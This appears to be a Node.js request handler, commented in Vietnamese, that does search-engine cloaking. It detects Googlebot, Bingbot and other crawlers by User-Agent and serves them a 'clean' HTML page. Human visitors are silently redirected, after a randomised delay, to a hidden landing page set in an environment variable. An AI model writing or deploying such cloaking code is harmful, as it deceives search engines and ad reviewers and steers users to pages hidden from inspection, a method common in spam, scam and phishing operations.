const path = require('path');

const knownGoogleBotIPs = [
  // Thêm các dải IP Googlebot nếu muốn kiểm tra IP (tùy chọn)
  // '66.249.64.0/19', ...
];

function isGoogleBot(userAgent, req) {
  // Nâng cao nhận diện Googlebot với nhiều biến thể và kiểm tra IP (nếu cần)
  const botPatterns = [
    /googlebot/i,
    /adsbot-google/i,
    /mediapartners-google/i,
    /apis-google/i,
    /feedfetcher-google/i,
    /google favicon/i,
    /google web preview/i,
    /google-read-aloud/i,
    /duplexweb-google/i,
    /google-speakr/i,
    /bingbot/i,
    /slurp/i,
    /duckduckbot/i,
    /baiduspider/i,
    /yandexbot/i,
    /sogou/i,
    /exabot/i,
    /facebot/i,
    /ia_archiver/i
  ];
  // Kiểm tra User-Agent
  const isBotUA = botPatterns.some((re) => re.test(userAgent));
  // Có thể kiểm tra thêm header hoặc IP ở đây nếu muốn
  // Ví dụ: kiểm tra x-forwarded-for hoặc req.ip
  return isBotUA;
}

exports.handleRedirect = async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  console.log('🔍 UA:', ua);

  const LANDING_PAGE_URL = process.env.LANDING_PAGE_URL;
  if (!LANDING_PAGE_URL) {
    console.error('❌ Thiếu biến môi trường LANDING_PAGE_URL');
    return res.status(500).send('Server misconfiguration');
  }

  if (isGoogleBot(ua, req)) {
    console.log('🤖 Googlebot hoặc hành vi nghi ngờ ➜ trả HTML sạch');
    return res.sendFile(path.join(__dirname, '../view/index.html'));
  }

  // Người dùng thật, thêm delay nhẹ trước khi redirect
  await new Promise(r => setTimeout(r, Math.floor(300 + Math.random() * 200)));
  console.log('🚶 Người dùng thật ➜ redirect đến landing page (User-Agent: ' + ua + ')');
  return res.redirect(302, LANDING_PAGE_URL);
};
